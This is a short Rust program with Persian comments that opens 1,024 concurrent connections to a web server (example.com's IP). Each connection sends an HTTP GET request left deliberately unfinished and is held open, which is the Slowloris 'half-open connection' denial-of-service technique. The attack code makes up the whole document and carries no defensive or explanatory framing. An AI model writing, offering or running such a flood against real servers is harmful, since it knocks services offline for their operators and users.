use tokio::net::TcpStream;
use tokio::io::AsyncWriteExt;
use tokio::time::{sleep, Duration};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let target_ip = "93.184.216.34"; // آدرس IP برای example.com
    let target_port = 80; // پورت HTTP
    let connection_count = 1024; // تعداد اتصالات نیمه‌باز
    let hold_duration = Duration::from_secs(3); // مدت زمان نگهداری اتصال

    let mut handles = vec![];

    for _ in 0..connection_count {
        let target_ip = target_ip.to_string();
        let target_port = target_port;
        let handle = tokio::spawn(async move {
            match TcpStream::connect(format!("{}:{}", target_ip, target_port)).await {
                Ok(mut stream) => {
                    let request = b"GET / HTTP/1.1\r\nHost: example.com\r\n";
                    if let Err(err) = stream.write_all(request).await {
                        eprintln!("Failed to write to stream: {}", err);
                        return;
                    }
                    sleep(hold_duration).await;
                }
                Err(err) => {
                    eprintln!("Failed to connect: {}", err);
                }
            }
        });

        handles.push(handle);
    }

    for handle in handles {
        if let Err(err) = handle.await {
            eprintln!("Handle error: {}", err);
        }
    }

    Ok(())
}
